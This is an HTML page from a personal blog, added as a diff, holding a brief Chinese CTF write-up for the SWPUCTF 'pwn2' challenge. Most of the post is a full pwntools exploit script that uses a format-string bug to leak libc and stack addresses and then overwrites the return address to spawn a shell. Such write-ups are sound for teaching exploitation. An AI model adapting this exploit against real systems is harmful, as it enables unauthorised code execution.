@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    SWPUCTF |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-SWPUCTF" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SWPUCTF
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/16/SWPUCTF/" class="article-date">
+  <time datetime="2019-12-16T12:41:58.763Z" itemprop="datePublished">2019-12-16</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>先check</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638684522.png" alt="1575638684522"></p>
+<p>还可以、</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638774113.png" alt="1575638774113"></p>
+<p>这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh）</p>
+<p>难度在于</p>
+<p>1.查找libc版本</p>
+<p>2.改写链的地址</p>
+<p>3.对于改写的话需要一个一个字节的去改写，具体看脚本</p>
+<p> <a href="C:\Users\Administrator\Desktop\login.py">login.py</a> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./login'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'108.160.139.79'</span></span><br><span class="line">port = <span class="string">'9090'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">lib = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(ip,int(port))</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">key = <span class="string">"wllmmllw"</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: \n"</span>,<span class="string">"pumpkin9"</span>)</span><br><span class="line">payload = <span class="string">"%15$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"password: \n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-241</span>-lib.symbols[<span class="string">'__libc_start_main'</span>]<span class="comment">#获取libc基地址</span></span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc)</span><br><span class="line">onegg = libc + lib.symbols[<span class="string">'system'</span>]<span class="comment">#获取system地址</span></span><br><span class="line">ls(<span class="string">"one_gadget"</span>,onegg)</span><br><span class="line">binsh = libc + lib.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#获取bin/sh地址</span></span><br><span class="line">ls(<span class="string">"sh addr"</span>,binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Try again!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="comment">#获取的是ebp中的内容</span></span><br><span class="line">target = stack <span class="number">-12</span> <span class="comment">#这个的计算结果为返回地址</span></span><br><span class="line">ls(<span class="string">"stack addr"</span>,stack)</span><br><span class="line">ls(<span class="string">"target addr"</span>,target)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">num = target&amp;<span class="number">0xff</span><span class="comment">#进行按位与运算目的是除去多余的位数，在这里是保留后12位</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="number">0x100</span><span class="comment">#onegg&amp;0xff</span></span><br><span class="line">data2 = (onegg&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span> <span class="comment">#右移位运算获取第二个字符位</span></span><br><span class="line">data3 = (onegg&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span><span class="comment">#获取第三个字符位</span></span><br><span class="line">data4 = onegg&gt;&gt;<span class="number">24</span><span class="comment">#获取第四个字符位</span></span><br><span class="line">li(<span class="string">"sys1"</span>,data1)</span><br><span class="line">li(<span class="string">"sys2"</span>,data2)</span><br><span class="line">li(<span class="string">"sys3"</span>,data3)</span><br><span class="line">li(<span class="string">"sys3"</span>,data4)</span><br><span class="line">data5 = binsh&amp;<span class="number">0xff</span><span class="comment">#同data1-4的作用</span></span><br><span class="line">data6 = ((binsh&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">data7 = ((binsh&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">data8 = binsh&gt;&gt;<span class="number">24</span></span><br><span class="line">li(<span class="string">"sh1"</span>,data5)</span><br><span class="line">li(<span class="string">"sh2"</span>,data6)</span><br><span class="line">li(<span class="string">"sh3"</span>,data7)</span><br><span class="line">li(<span class="string">"sh4"</span>,data8)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data1)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">1</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data2)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">2</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data3)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">3</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data4)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">8</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#参数放到返回地址后面即可</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data5)+<span class="string">"c%10$hhn"</span>)<span class="comment">#但是为什么要间隔四个字节呢</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">9</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#对于32位的程序根据libc中的system一般都要这样</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data6)+<span class="string">"c%10$hhn"</span>)<span class="comment">#先记住</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">10</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data7)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">11</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data8)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,key)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/16/SWPUCTF/" data-id="ck48fgstu00009ou39gihbdfw"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">web狗之xml实体攻击</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '',
+      clientSecret: '',
+      repo: '',
+      owner: '',
+      admin: [''],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
